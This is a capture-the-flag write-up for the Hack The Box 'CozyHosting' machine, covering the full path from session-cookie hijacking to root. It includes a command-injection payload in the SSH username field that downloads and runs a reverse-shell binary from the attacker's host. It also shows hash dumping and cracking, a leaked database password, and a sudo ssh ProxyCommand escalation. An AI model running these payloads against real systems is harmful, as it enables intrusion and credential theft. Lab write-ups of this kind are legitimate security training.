# CozyHosting HTB

We scan the ports and nmap reports that *22, 80* are open and 80 is running a http server with the name of *http://cozyhosting.htb*

On the main page there is nothing interesting so we proceed with dir enumeration.

# Dirsearch

```bash
dirsearch -u https://cozyhosting.htb -e*
```

We receive a few things interesting

```bash
http://cozyhosting.htb/login
http://cozyhosting.htb/actuator
http://cozyhosting.htb/actuator/sessions
```

It seems that `/actuator/sessions` has a cookie key on it, so lets try it.

```bash
{
"9F1ED37C18F8EA944FD631F215E03643": "kanderson"
}
```

We open the *Inspect* on the browser adn go to *Storage>Cookies" and replace our cookie with the one from kanderson.

Lets refresh and we find an admin pannel lets take a further look to it.

# Admin Panel

It seems that we can add ourselfs to the target machine, lets try it out.

We get an error but looking at the URL we find something interesting

```bash
http://cozyhosting.htb/admin?error=ssh:%20connect%20to%20host%2010.10.16.3%20port%2022:%20Connection%20timed%20out
```

So it seems that the machine is running something on error lets try something out if we input <ip> and on the username field we add `;whoami` we get this error.


```bash
http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kali: Temporary failure in name resolution/bin/bash: line 1: id@10.10.16.3: command not found
``` 

So he is working with ssh, lets try this on the username field

> The ${IFS} is the equivalent to a white space character.

```bash
python -m http.server 80

# If we receive a GET request its working

;wget${IFS}10.10.16.3/test;#

# 10.10.11.230 - - [11/Feb/2024 10:59:12] "GET /test HTTP/1.1" 404 -
# So it works lets go for a reverse shell

```
Lets do it with [reverse-ssh](https://github.com/Fahrj/reverse-ssh/releases/download/v1.2.0/reverse-sshx64)

```bash
# Set the listener

./reverse-sshx64 -v -l -p 443

;wget${IFS}http://10.10.16.3/reverse-sshx64${IFS}-P${IFS}/tmp;chmod${IFS}777${IFS}/tmp/reverse-sshx64;/tmp/reverse-sshx64${IFS}-p${IFS}443${IFS}10.10.16.3;#

# One liner
host=10.10.16.3&username=;wget${IFS}http://10.10.16.3/reverse-sshx64${IFS}-P${IFS}/tmp;chmod${IFS}777${IFS}/tmp/reverse-sshx64;/tmp/reverse-sshx64${IFS}-p${IFS}443${IFS}10.10.16.3;#

# Connecting via SSH

ssh 127.0.0.1 -p 8888

#PASSWORD: letmeinbrudipls
```

# Opening file cloudhosting-0.0.1.jar


```bash
#We mount the server 

python3 -m http.server 1111

# On kali we download
wget http://10.10.11.230:1111/cloudhosting-0.0.1.jar

# Install

sudo apt install jd-gui

# Open

jd-gui cloudhosting-0.0.1.jar

# We find this

server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR

# Connect to the DB
psql -h 127.0.0.1 -U postgres

# List Databases

\l

# Use the correct database
\c cozyhosting

# List tables
\dt 
# Lets try this

SELECT * FROM users;

   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

[psql cheatsheet](https://www.timescale.com/learn/postgres-cheat-seet/databases)

Now lets decode those hashes with **hashcat** or **john** and indentify their hashtype

[hash-id](https://github.com/blackploit/hash-identifier.git)

```bash
    ##With john
    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    ##With hashcat
    hashcat -m 30600 ./hash.txt /usr/share/wordlists/rockyou.txt
```

After getting the password we make `sudo -l` and we find that josh can run one commando as root `(root) /usr/bin/ssh *`

there is a thing with this, we can use [GTFOBins - Shell](https://gtfobins.github.io/gtfobins/ssh/#sudo)

```bash
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# And congrats you are runing as root
```